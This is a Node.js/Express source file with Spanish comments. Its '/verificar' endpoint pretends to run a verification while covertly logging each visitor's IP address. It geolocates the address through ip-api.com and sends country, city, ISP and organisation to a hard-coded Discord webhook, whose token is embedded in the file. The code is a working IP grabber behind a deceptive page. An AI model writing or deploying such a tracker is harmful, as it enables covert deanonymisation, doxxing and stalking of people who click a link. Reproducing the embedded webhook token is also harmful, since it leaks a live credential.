const express = require('express');
const axios = require('axios');
const app = express();

// REEMPLAZA ESTO CON TU URL REAL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1492252389309284483/_lOBqQKqD0FP-6ZxtlkE048cLKLK6FqLewkbpLirDN7t1xX2natpz8kUG0SfTKLLoQfu';

app.get('/verificar', async (req, res) => {
    try {
        // Obtener IP del visitante
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Consultar datos de la IP
        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,query`);
        const info = geoRes.data;

        // Enviar al Webhook de Discord
        await axios.post(DISCORD_WEBHOOK_URL, {
            embeds: [{
                title: "🔔 Nueva Visita Detectada",
                color: 3447003, // Color azul
                fields: [
                    { name: "IP", value: info.query || ip, inline: true },
                    { name: "País/Ciudad", value: `${info.country}, ${info.city}`, inline: true },
                    { name: "Proveedor (ISP)", value: info.isp || "Desconocido" },
                    { name: "Organización", value: info.org || "N/A" }
                ],
                timestamp: new Date()
            }]
        });

        // Lo que ve el usuario en su navegador
        res.send("<h1>Verificación en proceso...</h1><p>Revisa tu Discord.</p>");

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Error en el servidor");
    }
});

// El servidor escuchará en el puerto 3000
app.listen(3000, () => {
    console.log('Backend corriendo en http://localhost:3000/verificar');
});